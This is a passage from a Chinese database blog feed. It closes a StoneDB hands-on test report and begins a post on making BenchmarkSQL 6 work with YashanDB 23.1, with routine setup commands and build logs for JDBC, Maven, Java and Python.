<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash">show variables like <span class="string">&#x27;default_storage_engine&#x27;</span>;</span></span><br><span class="line">+------------------------+--------+</span><br><span class="line">| Variable_name          | Value  |</span><br><span class="line">+------------------------+--------+</span><br><span class="line">| default_storage_engine | InnoDB |</span><br><span class="line">+------------------------+--------+</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure></div>
<p>而且找不到任何关于 Tianmu 的变量，无法创建 Tianmu 引擎的表。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash">show variables like <span class="string">&#x27;tianmu_%&#x27;</span>;</span></span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash">create table student(<span class="built_in">id</span> int(11) primary key, name varchar(10)) engine=tianmu;</span></span><br><span class="line">ERROR 1286 (42000): Unknown storage engine &#x27;tianmu&#x27;</span><br></pre></td></tr></table></figure></div>
<p>文档中没找到相关信息，个人推测是引入了 MonetDB 来取代 Tianmu 作为新的列存引擎。</p>
<h3 id="Q7-路径问题">Q7: 路径问题</h3>
<p>有两个隐藏文件里，里面指向的路径不存在。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[mysql@rocky9 dbfarm]$ pwd</span><br><span class="line">/opt/stonedb_v2/install/var/monetdb5/dbfarm</span><br><span class="line">[mysql@rocky9 dbfarm]$ tail -n 2 .merovingian_properties </span><br><span class="line">logfile=/var/opt/stonedb_v2/install/log/monetdb/merovingian.log</span><br><span class="line">pidfile=/var/run/opt/stonedb_v2/install/monetdb/merovingian.pid</span><br><span class="line">[mysql@rocky9 dbfarm]$ </span><br></pre></td></tr></table></figure></div>
<p>另外，文件 <code>mysqlrouter-log-rotate</code> 建议移动到 <code>support-files</code> 路径下。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[mysql@rocky9 install]$ pwd</span><br><span class="line">/opt/stonedb_v2/install</span><br><span class="line">[mysql@rocky9 install]$ ll mysqlrouter-log-rotate </span><br><span class="line">-rw-r--r--. 1 mysql mysql 1623 Nov 30 14:36 mysqlrouter-log-rotate</span><br><span class="line">[mysql@rocky9 install]$ tree support-files/</span><br><span class="line">support-files/</span><br><span class="line">├── mysqld_multi.server</span><br><span class="line">├── mysql-log-rotate</span><br><span class="line">└── mysql.server</span><br><span class="line"></span><br><span class="line">0 directories, 3 files</span><br></pre></td></tr></table></figure></div>
<h2 id="总结">总结</h2>
<p>2c4g 着实有点难为 StoneDB 了，还是要多给点资源才能跑的动，后来在 8c16g 环境下才运行起来，只是内存使用接近 6g。</p>
<img  alt="imgmem6g.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231206-d9501602-e7d3-4ab8-8fea-0d3765204cc4.png"
                      referrerpolicy="no-referrer"
                >
<p>希望企业版的体验会更好，<s>而不是叫企业版的原型</s>。</p>
<p>StoneDB 的迭代速度还是蛮快的，期待下个版本。</p>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/1732209819015782400" >https://www.modb.pro/db/1732209819015782400 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<hr class="footnotes-sep">
<section class="footnotes">
<ol class="footnotes-list">
<li id="fn1" class="footnote-item"><p><a class="link"   href="https://www.stoneatom.com/StonedbDocs?id=352" >https://www.stoneatom.com/StonedbDocs?id=352 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref1" class="footnote-backref">↩︎</a></p>
</li>
</ol>
</section>
]]></content>
      <categories>
        <category>StoneDB</category>
      </categories>
      <tags>
        <tag>stonedb</tag>
        <tag>monetdb</tag>
      </tags>
  </entry>
  <entry>
    <title>「YashanDB个人版体验」YashanDB 23.1 与 BenchmarkSQL 6 兼容性适配</title>
    <url>/2023/yashan/yashandb-benchmarksql/</url>
    <content><![CDATA[<h2 id="TL-DR">TL;DR</h2>
<p>本文主要介绍 YashanDB 与 BenchmarkSQL 的兼容适配过程，以及演示简单测试过程。</p>
<p>YashanDB 基于原创内核架构，全面支持众核、RDMA、智能计算、云基础设施等面向未来的软硬件技术，采用异步并行、基于代价的事务调度、Raft、有界计算等创新技术和算法，满足企业级核心应用对高兼容、高性能、高扩展、高可用等全生命周期数据管理诉求。</p>
<img  alt="图片.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231203-d12ef744-7a0d-4ff9-a220-3e79ae9d7a9e.png"
                      referrerpolicy="no-referrer"
                >
<p>BenchmarkSQL 是一款基于 JDBC 实现的 TPC-C 标准测试工具，支持主流关系型数据库，如：PostgreSQL,MySQL,MariaDB,Oracle 等。</p>
<img  alt="图片.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231203-67036bcd-94dd-4957-8122-c1fe5474b861.png"
                      referrerpolicy="no-referrer"
                >
<p>文末放出本次兼容适配的成果物，欢迎大家下载使用。</p>
<h2 id="概念介绍">概念介绍</h2>
<h3 id="YashanDB">YashanDB</h3>
<p>崖山数据库系统 YashanDB 是深圳计算科学研究院完全自主研发设计的新型数据库系统，融入原创理论，支持单机/主备、共享集群、分布式等多种部署方式，覆盖 OLTP/HTAP/OLAP 交易和分析混合负载场景，为客户提供一站式的企业级融合数据管理解决方案。</p>
<img  alt="图片.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231203-5d9ff704-4673-4a40-b126-d3d81731a8ce.png"
                      referrerpolicy="no-referrer"
                >
<p>YashanDB 个人版介质下载地址为：<a class="link"   href="https://download.yashandb.com/download" >https://download.yashandb.com/download <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="BenchmarkSQL">BenchmarkSQL</h3>
<p>BenchmarkSQL 是用 Java 实现的，使用 JDBC 对 SQL 数据库进行压力测试。整个体系结构是一系列数据结构、队列和线程组，用于处理模拟终端、用户和应用程序线程。它的体系结构允许 BenchmarkSQL 驱动最多的 TPC-C 配置数千个仓库(称为缩放因子)，而不会压倒测试驱动程序本身的作业调度器。</p>
<p>目前，最新版本为 BenchmarkSQL 6.0，已兼容数据库: Oracle, PostgreSQL, Firebird, MariaDB, Transac-sql, Babelfish.</p>
<img  alt="图片.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231203-acb59f5b-4d72-4479-bf03-83e6eb28af42.png"
                      referrerpolicy="no-referrer"
                >
<p>需要说明的是，YashanDB 官方文档中有专门一个章节介绍 TPC-C 测试，只是提及“请自行于BenchmarkSQL官网下载Benchmark SQL5”，版本陈旧，且没有给出下载链接和适配完成的成果物，建议文档迭代更新。</p>
<p>本文所使用的 BenchmarkSQL 版本基于最新版，gh 地址为：<a class="link"   href="https://github.com/pgsql-io/benchmarksql" >https://github.com/pgsql-io/benchmarksql <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="环境介绍">环境介绍</h2>
<h3 id="YashanDB-数据库">YashanDB 数据库</h3>
<h4 id="YashanDB-个人版">YashanDB 个人版</h4>
<p>目前，YashanDB 数据库只开放了个人版下载，本文使用的版本如下：</p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">[yashan@shawnyan ~]$ yasql sys/yasdb_123</span><br><span class="line">YashanDB SQL Personal Edition Release 23.1.1.100 x86_64</span><br><span class="line"></span><br><span class="line">Connected to:</span><br><span class="line">YashanDB Server Personal Edition Release 23.1.1.100 x86_64 - X86 64bit Linux</span><br><span class="line"></span><br><span class="line">SQL&gt; <span class="keyword">select</span> * from v<span class="variable">$version</span>;</span><br><span class="line"></span><br><span class="line">BANNER                                                           VERSION_NUMBER    </span><br><span class="line">---------------------------------------------------------------- ----------------- </span><br><span class="line">Personal Edition Release 23.1.1.100 x86_64                       23.1.1.100       </span><br><span class="line"></span><br><span class="line">1 row fetched.</span><br></pre></td></tr></table></figure></div>
<p>这里不再介绍如何安装，具体步骤可参考我之前的文章：</p>
<ul>
<li><a href="https://shawnyan.cn/2023/yashan/yashandb-install/">「YashanDB个人版体验」YashanDB 个人版安装初体验</a></li>
<li><a href="https://shawnyan.cn/2023/yashan/yashandb-dockerfile/">「YashanDB个人版体验」定制 Dockerfile 构建 YashanDB 个人版镜像，并基于此搭建主备高可用</a></li>
</ul>
<!--
- [「YashanDB个人版体验」YashanDB 个人版安装初体验](https://www.modb.pro/db/1719038517697929216)
- [「YashanDB个人版体验」定制 Dockerfile 构建 YashanDB 个人版镜像，并基于此搭建主备高可用](https://www.modb.pro/db/1727742975546564608)
-->
<h4 id="YashanDB-JDBC">YashanDB JDBC</h4>
<p>目前 YashanDB 官方提供 JDBC, ODBC, C 三种驱动的下载，下载页面是：<a class="link"   href="https://download.yashandb.com/download" >https://download.yashandb.com/download <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<img  alt="图片.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231203-41e24213-ada8-4aac-b6c3-a8e9e8cc4a55.png"
                      referrerpolicy="no-referrer"
                >
<p>需要注意的是，JDBC 并没有上传 Maven 仓库，已反馈给官方。<br>
如需 Java 开发，需要先下载到本地，然后自行引入，引入方式如下。</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- YashanDB --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- https://download.yashandb.com/download --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.yashandb.jdbc<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>yashandb-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>1.5.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">scope</span>&gt;</span>system<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">systemPath</span>&gt;</span>$&#123;project.basedir&#125;/lib/yashandb-jdbc-1.5.1.jar<span class="tag">&lt;/<span class="name">systemPath</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>另外，关于 ODBC 的使用，可参考我之前的文章：</p>
<ul>
<li><a href="https://shawnyan.cn/2023/yashan/yashandb-odbc/">「YashanDB个人版体验」通过 ODBC 连接 YashanDB 和 MariaDB</a></li>
</ul>
<!--
- [「YashanDB个人版体验」通过 ODBC 连接 YashanDB 和 MariaDB](https://www.modb.pro/db/1729697884671664128)
-->
<h3 id="BenchmarkSQL-测试工具">BenchmarkSQL 测试工具</h3>
<p>克隆 BenchmarkSQL 源码，并查看源码版本信息。</p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">$ git lg</span><br><span class="line">* 0ab7d4d - (HEAD -&gt; yashandb, origin/yashandb) Support YashanDB. (4 hours ago) &lt;ShawnYan&gt;</span><br><span class="line">* 727d5e9 - (origin/master, origin/HEAD, shawnyan, master) Add config parameters to run only on a range of warehouses (12 months ago) &lt;Jan Wieck&gt;</span><br></pre></td></tr></table></figure></div>
<h3 id="CentOS-操作系统">CentOS 操作系统</h3>
<p>本文所使用的操作系统为 CentOS 7，具体版本信息如下：</p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">[yashan@shawnyan ~]$ <span class="built_in">cat</span> /etc/redhat-release </span><br><span class="line">CentOS Linux release 7.9.2009 (Core)</span><br><span class="line">[yashan@shawnyan ~]$ <span class="built_in">uname</span> -a</span><br><span class="line">Linux shawnyan 3.10.0-1160.95.1.el7.x86_64 <span class="comment">#1 SMP Mon Jul 24 13:59:37 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span></span><br></pre></td></tr></table></figure></div>
<p>选择这个版本的主要原因是目前崖山数据库提供的安装包多为 el7 版本。<br>
当然，高版本 OS 环境也可以使用，如我先前做的测试就是在 Rocky Linux 9.3 环境下。</p>
<h3 id="Java-环境">Java 环境</h3>
<p>BenchmarkSQL 6 需要 JDK 1.8 环境，可通过 yum 直接安装。</p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">yashan@shawnyan ~]$ rpm -qa | grep java-1.8</span><br><span class="line">java-1.8.0-openjdk-1.8.0.392.b08-2.el7_9.x86_64</span><br><span class="line">java-1.8.0-openjdk-headless-1.8.0.392.b08-2.el7_9.x86_64</span><br><span class="line">java-1.8.0-openjdk-devel-1.8.0.392.b08-2.el7_9.x86_64</span><br><span class="line">[yashan@shawnyan ~]$ </span><br></pre></td></tr></table></figure></div>
<p>安装完成后，查看版本：</p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">[yashan@shawnyan ~]$ java -version</span><br><span class="line">openjdk version <span class="string">&quot;1.8.0_392&quot;</span></span><br><span class="line">OpenJDK Runtime Environment (build 1.8.0_392-b08)</span><br><span class="line">OpenJDK 64-Bit Server VM (build 25.392-b08, mixed mode)</span><br><span class="line">[yashan@shawnyan ~]$ </span><br></pre></td></tr></table></figure></div>
<h3 id="Maven-编译工具">Maven 编译工具</h3>
<p>对于上古版本的 Java 项目，需要使用 Ant 作为编译工具，而 BenchmarkSQL 6 已经替换为使用 Maven 作为编译工具，可以通过 yum 直接安装：</p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">[root@shawnyan ~]<span class="comment"># yum info maven</span></span><br><span class="line">Loaded plugins: fastestmirror, langpacks</span><br><span class="line">Loading mirror speeds from cached hostfile</span><br><span class="line">Installed Packages</span><br><span class="line">Name        : maven</span><br><span class="line">Arch        : noarch</span><br><span class="line">Version     : 3.0.5</span><br><span class="line">Release     : 17.el7</span><br><span class="line">Size        : 1.6 M</span><br><span class="line">Repo        : installed</span><br><span class="line">From repo   : base-aliyun</span><br><span class="line">Summary     : Java project management and project comprehension tool</span><br><span class="line">URL         : http://maven.apache.org/</span><br><span class="line">License     : ASL 2.0</span><br><span class="line">Description : Maven is a software project management and comprehension tool. Based on the</span><br><span class="line">            : concept of a project object model (POM), Maven can manage a project<span class="string">&#x27;s build,</span></span><br><span class="line"><span class="string">            : reporting and documentation from a central piece of information.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[root@shawnyan ~]# mvn -v</span></span><br><span class="line"><span class="string">Apache Maven 3.0.5 (Red Hat 3.0.5-17)</span></span><br><span class="line"><span class="string">Maven home: /usr/share/maven</span></span><br><span class="line"><span class="string">Java version: 1.8.0_392, vendor: Red Hat, Inc.</span></span><br><span class="line"><span class="string">Java home: /usr/lib/jvm/java-1.8.0-openjdk-1.8.0.392.b08-2.el7_9.x86_64/jre</span></span><br><span class="line"><span class="string">Default locale: en_US, platform encoding: UTF-8</span></span><br><span class="line"><span class="string">OS name: &quot;linux&quot;, version: &quot;3.10.0-1160.95.1.el7.x86_64&quot;, arch: &quot;amd64&quot;, family: &quot;unix&quot;</span></span><br><span class="line"><span class="string">[root@shawnyan ~]# </span></span><br></pre></td></tr></table></figure></div>
<p>但是，该版本太低，使用时会遇到报错。</p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">[root@shawnyan benchmarksql]<span class="comment"># mvn </span></span><br><span class="line">[INFO] Scanning <span class="keyword">for</span> projects...</span><br><span class="line">[WARNING] </span><br><span class="line">[WARNING] Some problems were encountered <span class="keyword">while</span> building the effective model <span class="keyword">for</span> com.github.pgsql-io:benchmarksql:jar:6.0.0-SNAPSHOT</span><br><span class="line">[WARNING] <span class="string">&#x27;dependencies.dependency.systemPath&#x27;</span> <span class="keyword">for</span> com.yashandb.jdbc:yashandb-jdbc:jar should not point at files within the project directory, <span class="variable">$&#123;project.basedir&#125;</span>/lib/yashandb-jdbc-1.5.1.jar will be unresolvable by dependent projects @ line 91, column 16</span><br><span class="line">[WARNING] </span><br><span class="line">[WARNING] It is highly recommended to fix these problems because they threaten the stability of your build.</span><br><span class="line">[WARNING] </span><br><span class="line">[WARNING] For this reason, future Maven versions might no longer support building such malformed projects.</span><br><span class="line">[WARNING] </span><br><span class="line">[INFO]                                                                         </span><br><span class="line">[INFO] ------------------------------------------------------------------------</span><br><span class="line">[INFO] Building A TPC-C like <span class="built_in">test</span> tool 6.0.0-SNAPSHOT</span><br><span class="line">[INFO] ------------------------------------------------------------------------</span><br><span class="line">Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-resources-plugin/3.2.0/maven-resources-plugin-3.2.0.pom</span><br><span class="line">Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-resources-plugin/3.2.0/maven-resources-plugin-3.2.0.pom (8 KB at 4.6 KB/sec)</span><br><span class="line">Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-plugins/34/maven-plugins-34.pom</span><br><span class="line">Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-plugins/34/maven-plugins-34.pom (11 KB at 27.5 KB/sec)</span><br><span class="line">Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/maven-parent/34/maven-parent-34.pom</span><br><span class="line">Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/maven-parent/34/maven-parent-34.pom (42 KB at 84.7 KB/sec)</span><br><span class="line">Downloading: https://repo.maven.apache.org/maven2/org/apache/apache/23/apache-23.pom</span><br><span class="line">Downloaded: https://repo.maven.apache.org/maven2/org/apache/apache/23/apache-23.pom (18 KB at 44.4 KB/sec)</span><br><span class="line">Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-resources-plugin/3.2.0/maven-resources-plugin-3.2.0.jar</span><br><span class="line">Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-resources-plugin/3.2.0/maven-resources-plugin-3.2.0.jar (33 KB at 61.9 KB/sec)</span><br><span class="line">Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-compiler-plugin/3.8.0/maven-compiler-plugin-3.8.0.pom</span><br><span class="line">Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-compiler-plugin/3.8.0/maven-compiler-plugin-3.8.0.pom (13 KB at 23.8 KB/sec)</span><br><span class="line">Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-plugins/32/maven-plugins-32.pom</span><br><span class="line">Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-plugins/32/maven-plugins-32.pom (11 KB at 38.2 KB/sec)</span><br><span class="line">Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/maven-parent/32/maven-parent-32.pom</span><br><span class="line">Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/maven-parent/32/maven-parent-32.pom (43 KB at 45.0 KB/sec)</span><br><span class="line">Downloading: https://repo.maven.apache.org/maven2/org/apache/apache/20/apache-20.pom</span><br><span class="line">Downloaded: https://repo.maven.apache.org/maven2/org/apache/apache/20/apache-20.pom (16 KB at 33.8 KB/sec)</span><br><span class="line">Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-compiler-plugin/3.8.0/maven-compiler-plugin-3.8.0.jar</span><br><span class="line">Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-compiler-plugin/3.8.0/maven-compiler-plugin-3.8.0.jar (61 KB at 47.3 KB/sec)</span><br><span class="line">Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-surefire-plugin/2.10/maven-surefire-plugin-2.10.pom</span><br><span class="line">Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-surefire-plugin/2.10/maven-surefire-plugin-2.10.pom (11 KB at 28.5 KB/sec)</span><br><span class="line">Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/surefire/surefire/2.10/surefire-2.10.pom</span><br><span class="line">Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/surefire/surefire/2.10/surefire-2.10.pom (12 KB at 32.1 KB/sec)</span><br><span class="line">Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/maven-parent/20/maven-parent-20.pom</span><br><span class="line">Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/maven-parent/20/maven-parent-20.pom (25 KB at 39.3 KB/sec)</span><br><span class="line">Downloading: https://repo.maven.apache.org/maven2/org/apache/apache/9/apache-9.pom</span><br><span class="line">Downloaded: https://repo.maven.apache.org/maven2/org/apache/apache/9/apache-9.pom (15 KB at 29.5 KB/sec)</span><br><span class="line">Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-surefire-plugin/2.10/maven-surefire-plugin-2.10.jar</span><br><span class="line">Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-surefire-plugin/2.10/maven-surefire-plugin-2.10.jar (30 KB at 47.8 KB/sec)</span><br><span class="line">Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-jar-plugin/2.4/maven-jar-plugin-2.4.pom</span><br><span class="line">Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-jar-plugin/2.4/maven-jar-plugin-2.4.pom (6 KB at 19.8 KB/sec)</span><br><span class="line">Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-plugins/22/maven-plugins-22.pom</span><br><span class="line">Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-plugins/22/maven-plugins-22.pom (13 KB at 27.3 KB/sec)</span><br><span class="line">Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/maven-parent/21/maven-parent-21.pom</span><br><span class="line">Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/maven-parent/21/maven-parent-21.pom (26 KB at 33.3 KB/sec)</span><br><span class="line">Downloading: https://repo.maven.apache.org/maven2/org/apache/apache/10/apache-10.pom</span><br><span class="line">Downloaded: https://repo.maven.apache.org/maven2/org/apache/apache/10/apache-10.pom (15 KB at 20.6 KB/sec)</span><br><span class="line">Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-jar-plugin/2.4/maven-jar-plugin-2.4.jar</span><br><span class="line">Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-jar-plugin/2.4/maven-jar-plugin-2.4.jar (34 KB at 42.5 KB/sec)</span><br><span class="line">Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-dependency-plugin/3.0.0/maven-dependency-plugin-3.0.0.pom</span><br><span class="line">Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-dependency-plugin/3.0.0/maven-dependency-plugin-3.0.0.pom (14 KB at 33.5 KB/sec)</span><br><span class="line">Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-plugins/30/maven-plugins-30.pom</span><br><span class="line">Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-plugins/30/maven-plugins-30.pom (10 KB at 27.4 KB/sec)</span><br><span class="line">Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/maven-parent/30/maven-parent-30.pom</span><br><span class="line">Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/maven-parent/30/maven-parent-30.pom (41 KB at 45.2 KB/sec)</span><br><span class="line">Downloading: https://repo.maven.apache.org/maven2/org/apache/apache/18/apache-18.pom</span><br><span class="line">Downloaded: https://repo.maven.apache.org/maven2/org/apache/apache/18/apache-18.pom (16 KB at 24.4 KB/sec)</span><br><span class="line">Downloading: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-dependency-plugin/3.0.0/maven-dependency-plugin-3.0.0.jar</span><br><span class="line">Downloaded: https://repo.maven.apache.org/maven2/org/apache/maven/plugins/maven-dependency-plugin/3.0.0/maven-dependency-plugin-3.0.0.jar (161 KB at 44.9 KB/sec)</span><br><span class="line">[INFO] ------------------------------------------------------------------------</span><br><span class="line">[INFO] BUILD FAILURE</span><br><span class="line">[INFO] ------------------------------------------------------------------------</span><br><span class="line">[INFO] Total time: 20.140s</span><br><span class="line">[INFO] Finished at: Sat Dec 02 11:43:38 CST 2023</span><br><span class="line">[INFO] Final Memory: 10M/254M</span><br><span class="line">[INFO] ------------------------------------------------------------------------</span><br><span class="line">[ERROR] Failed to execute goal org.apache.maven.plugins:maven-resources-plugin:3.2.0:resources (default-resources) on project benchmarksql: The plugin org.apache.maven.plugins:maven-resources-plugin:3.2.0 requires Maven version 3.1.0 -&gt; [Help 1]</span><br><span class="line">[ERROR] </span><br><span class="line">[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.</span><br><span class="line">[ERROR] Re-run Maven using the -X switch to <span class="built_in">enable</span> full debug logging.</span><br><span class="line">[ERROR] </span><br><span class="line">[ERROR] For more information about the errors and possible solutions, please <span class="built_in">read</span> the following articles:</span><br><span class="line">[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/PluginIncompatibleException</span><br><span class="line">[root@shawnyan benchmarksql]<span class="comment"># </span></span><br></pre></td></tr></table></figure></div>
<p>工程里用到了插件【maven-resources-plugin:3.2.0】，索性我们就将 Maven 直接升级到最新版本 【Maven 3.9.6】。</p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">[root@shawnyan ~]<span class="comment"># wget https://dlcdn.apache.org/maven/maven-3/3.9.6/binaries/apache-maven-3.9.6-bin.zip</span></span><br><span class="line">--2023-12-02 12:03:07--  https://dlcdn.apache.org/maven/maven-3/3.9.6/binaries/apache-maven-3.9.6-bin.zip</span><br><span class="line">Resolving dlcdn.apache.org (dlcdn.apache.org)... 151.101.2.132, 2a04:4e42::644</span><br><span class="line">Connecting to dlcdn.apache.org (dlcdn.apache.org)|151.101.2.132|:443... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 9513253 (9.1M) [application/zip]</span><br><span class="line">Saving to: ‘apache-maven-3.9.6-bin.zip’</span><br><span class="line"></span><br><span class="line">100%[================================================================================&gt;] 9,513,253   66.7KB/s   <span class="keyword">in</span> 1m 52s </span><br><span class="line"></span><br><span class="line">2023-12-02 12:04:59 (82.7 KB/s) - ‘apache-maven-3.9.6-bin.zip’ saved [9513253/9513253]</span><br><span class="line"></span><br><span class="line">[root@shawnyan ~]<span class="comment"># unzip apache-maven-3.9.6-bin.zip </span></span><br><span class="line">Archive:  apache-maven-3.9.6-bin.zip</span><br><span class="line">...</span><br><span class="line">[root@shawnyan bin]<span class="comment"># ./mvn -v</span></span><br><span class="line">Apache Maven 3.9.6 (bc0240f3c744dd6b6ec2920b3cd08dcc295161ae)</span><br><span class="line">Maven home: /opt/maven</span><br><span class="line">Java version: 1.8.0_392, vendor: Red Hat, Inc., runtime: /usr/lib/jvm/java-1.8.0-openjdk-1.8.0.392.b08-2.el7_9.x86_64/jre</span><br><span class="line">Default locale: en_US, platform encoding: UTF-8</span><br><span class="line">OS name: <span class="string">&quot;linux&quot;</span>, version: <span class="string">&quot;3.10.0-1160.95.1.el7.x86_64&quot;</span>, <span class="built_in">arch</span>: <span class="string">&quot;amd64&quot;</span>, family: <span class="string">&quot;unix&quot;</span></span><br></pre></td></tr></table></figure></div>
<h3 id="Python-环境">Python 环境</h3>
<p>BenchmarkSQL 6 使用 Flask 作为 Web 框架，可通过浏览器进行配置、测试、查看结果，这里引入了 Python 环境。</p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">[root@shawnyan ~]<span class="comment"># python3 --version</span></span><br><span class="line">Python 3.6.8</span><br></pre></td></tr></table></figure></div>
<p>安装工程所需 Python 依赖。</p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">pip3 install pip --upgrade</span><br><span class="line">pip3 install -r requirements.txt</span><br></pre></td></tr></table></figure></div>
<p>输出：</p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">[root@centos7 resources]<span class="comment"># pip3 install -r requirements.txt</span></span><br><span class="line">Requirement already satisfied: Flask <span class="keyword">in</span> /usr/local/lib/python3.6/site-packages (from -r requirements.txt (line 4)) (2.0.3)</span><br><span class="line">Requirement already satisfied: numpy <span class="keyword">in</span> /usr/local/lib64/python3.6/site-packages (from -r requirements.txt (line 5)) (1.19.5)</span><br><span class="line">Requirement already satisfied: matplotlib <span class="keyword">in</span> /usr/local/lib64/python3.6/site-packages (from -r requirements.txt (line 6)) (3.3.4)</span><br><span class="line">Requirement already satisfied: paho-mqtt <span class="keyword">in</span> /usr/local/lib/python3.6/site-packages (from -r requirements.txt (line 7)) (1.6.1)</span><br><span class="line">Requirement already satisfied: jproperties <span class="keyword">in</span> /usr/local/lib/python3.6/site-packages (from -r requirements.txt (line 8)) (2.1.1)</span><br><span class="line">Requirement already satisfied: click&gt;=7.1.2 